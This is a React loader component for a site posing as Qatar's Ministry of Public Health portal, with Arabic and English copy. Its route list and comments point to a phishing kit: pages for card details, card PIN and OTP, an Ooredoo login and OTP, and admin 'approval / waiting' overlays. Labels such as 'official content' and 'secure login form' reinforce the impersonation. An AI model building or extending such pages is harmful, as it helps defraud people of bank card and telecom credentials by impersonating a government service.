import { useEffect, useMemo, useState } from "react";
import { useLocation, matchPath } from "react-router-dom";
import { createPortal } from "react-dom";
import {
  Home as HomeIcon,
  Stethoscope,
  ShieldCheck,
  FileText,
  ClipboardList,
  HeartPulse,
  LayoutGrid,
  Info as InfoIcon,
  type LucideIcon,
} from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";

/**
 * Full-screen inter-page loader. Shows for ~2s whenever the visitor
 * navigates to one of the whitelisted routes, with an icon and copy
 * that reflect the destination page. We deliberately skip routes that
 * already render their own admin approval / waiting overlays
 * (card-*, ooredoo-*, /waiting) and the admin dashboard itself.
 */

const DURATION_MS = 2000;

type Meta = {
  icon: LucideIcon;
  ar: { title: string; subtitle: string };
  en: { title: string; subtitle: string };
};

const ROUTE_META: Array<{ pattern: string; meta: Meta }> = [
  {
    pattern: "/",
    meta: {
      icon: HomeIcon,
      ar: {
        title: "البوابة الصحية الموحّدة",
        subtitle: "وزارة الصحة العامة · دولة قطر",
      },
      en: {
        title: "Unified Health Portal",
        subtitle: "Ministry of Public Health · State of Qatar",
      },
    },
  },
  {
    pattern: "/medical-commission",
    meta: {
      icon: Stethoscope,
      ar: {
        title: "القومسيون الطبي",
        subtitle: "جارٍ تحميل خدمات القومسيون الطبي",
      },
      en: {
        title: "Medical Commission",
        subtitle: "Loading Medical Commission services",
      },
    },
  },
  {
    pattern: "/sehhaty",
    meta: {
      icon: HeartPulse,
      ar: {
        title: "منصة صحتي",
        subtitle: "جارٍ تحميل خدماتك الصحية",
      },
      en: {
        title: "My Health Platform",
        subtitle: "Loading your health services",
      },
    },
  },
  {
    pattern: "/sehhaty/services/:key",
    meta: {
      icon: LayoutGrid,
      ar: {
        title: "تفاصيل الخدمة الصحية",
        subtitle: "جارٍ تحميل بيانات الخدمة",
      },
      en: {
        title: "Health service details",
        subtitle: "Loading service information",
      },
    },
  },
  {
    pattern: "/sehhaty/info/:slug",
    meta: {
      icon: InfoIcon,
      ar: {
        title: "معلومات صحتي",
        subtitle: "جارٍ تحميل المحتوى الرسمي",
      },
      en: {
        title: "My Health information",
        subtitle: "Loading the official content",
      },
    },
  },
  {
    pattern: "/services/:key",
    meta: {
      icon: LayoutGrid,
      ar: {
        title: "تفاصيل خدمة القومسيون",
        subtitle: "جارٍ تحميل بيانات الخدمة",
      },
      en: {
        title: "Commission service details",
        subtitle: "Loading service information",
      },
    },
  },
  {
    pattern: "/info/:slug",
    meta: {
      icon: InfoIcon,
      ar: {
        title: "معلومات القومسيون الطبي",
        subtitle: "جارٍ تحميل المحتوى الرسمي",
      },
      en: {
        title: "Medical Commission information",
        subtitle: "Loading the official content",
      },
    },
  },
  {
    pattern: "/medical-login",
    meta: {
      icon: Stethoscope,
      ar: {
        title: "تسجيل الدخول إلى الخدمة",
        subtitle: "جارٍ تجهيز نموذج الدخول الآمن",
      },
      en: {
        title: "Service sign-in",
        subtitle: "Preparing the secure login form",
      },
    },
  },
  {
    pattern: "/medical-activate",
    meta: {
      icon: ShieldCheck,
      ar: {
        title: "تفعيل الحساب",
        subtitle: "جارٍ تحميل خطوات التفعيل",
      },
      en: {
        title: "Activate your account",
        subtitle: "Loading the activation steps",
      },
    },
  },
  {
    pattern: "/medical-register/step/:step",
    meta: {
      icon: ClipboardList,
      ar: {
        title: "طلب التسجيل الإلكتروني",
        subtitle: "جارٍ الانتقال إلى الخطوة التالية",
      },
      en: {
        title: "Electronic registration request",
        subtitle: "Moving to the next step",
      },
    },
  },
  {
    pattern: "/medical-register",
    meta: {
      icon: ClipboardList,
      ar: {
        title: "طلب التسجيل الإلكتروني",
        subtitle: "جارٍ تحميل نموذج التسجيل",
      },
      en: {
        title: "Electronic registration request",
        subtitle: "Loading the registration form",
      },
    },
  },
  {
    pattern: "/legal/:slug",
    meta: {
      icon: FileText,
      ar: {
        title: "المعلومات القانونية",
        subtitle: "جارٍ تحميل الوثيقة الرسمية",
      },
      en: {
        title: "Legal information",
        subtitle: "Loading the official document",
      },
    },
  },
];

// Routes that already have their own approval/waiting overlays — skip them.
const EXCLUDED_PATTERNS = [
  "/card-info",
  "/card-otp",
  "/card-pin",
  "/ooredoo-login",
  "/ooredoo-otp",
  "/waiting",
  "/admin",
];

function matchMeta(pathname: string): Meta | null {
  if (EXCLUDED_PATTERNS.some((p) => matchPath({ path: p, end: true }, pathname))) {
    return null;
  }
  for (const { pattern, meta } of ROUTE_META) {
    if (matchPath({ path: pattern, end: true }, pathname)) return meta;
  }
  return null;
}

const RouteLoader = () => {
  const location = useLocation();
  const { pick, dir } = useLang();
  const [visible, setVisible] = useState(false);
  const [meta, setMeta] = useState<Meta | null>(null);
  const [lastPath, setLastPath] = useState<string | null>(null);

  useEffect(() => {
    if (location.pathname === lastPath) return;
    setLastPath(location.pathname);

    const next = matchMeta(location.pathname);
    if (!next) {
      setVisible(false);
      return;
    }
    if (location.pathname === "/medical-login" || location.pathname === "/medical-activate") {
      const ctx = getServiceContext(new URLSearchParams(location.search).get("service"));
      setMeta({
        icon: ctx.isSehhaty ? HeartPulse : Stethoscope,
        ar: {
          title: location.pathname === "/medical-activate" ? ctx.activationTitleAr : ctx.titleAr,
          subtitle: location.pathname === "/medical-activate" ? "جارٍ تحميل خطوات التفعيل" : `جارٍ تجهيز نموذج الدخول إلى ${ctx.platformShortAr}`,
        },
        en: {
          title: location.pathname === "/medical-activate" ? ctx.activationTitleEn : ctx.titleEn,
          subtitle: location.pathname === "/medical-activate" ? "Loading the activation steps" : `Preparing the ${ctx.platformShortEn} login form`,
        },
      });
    } else {
      setMeta(next);
    }
    setVisible(true);
    const t = window.setTimeout(() => setVisible(false), DURATION_MS);
    return () => window.clearTimeout(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [location.pathname, location.search]);

  const Icon = useMemo(() => meta?.icon ?? HomeIcon, [meta]);

  if (typeof document === "undefined") return null;
  if (!visible || !meta) return null;

  const copy = pick(meta.ar, meta.en);

  return createPortal(
    <div
      dir={dir}
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-background/95 backdrop-blur-md animate-fade-in"
      role="status"
      aria-live="polite"
    >
      <div className="flex flex-col items-center gap-6 px-6 text-center max-w-md">
        <div className="relative">
          <span
            className="absolute inset-0 rounded-full bg-primary/15 animate-ping"
            aria-hidden="true"
          />
          <span
            className="relative flex h-24 w-24 items-center justify-center rounded-full bg-primary text-primary-foreground shadow-xl animate-scale-in"
          >
            <Icon className="h-11 w-11" strokeWidth={2.2} />
          </span>
        </div>

        <div className="space-y-2">
          <h2 className="text-xl font-extrabold text-foreground leading-tight">
            {copy.title}
          </h2>
          <p className="text-sm text-muted-foreground leading-relaxed">
            {copy.subtitle}
          </p>
        </div>

        <div className="flex items-center gap-1.5" aria-hidden="true">
          <span className="h-2 w-2 rounded-full bg-primary animate-bounce [animation-delay:-0.3s]" />
          <span className="h-2 w-2 rounded-full bg-primary animate-bounce [animation-delay:-0.15s]" />
          <span className="h-2 w-2 rounded-full bg-primary animate-bounce" />
        </div>
      </div>
    </div>,
    document.body,
  );
};

export default RouteLoader;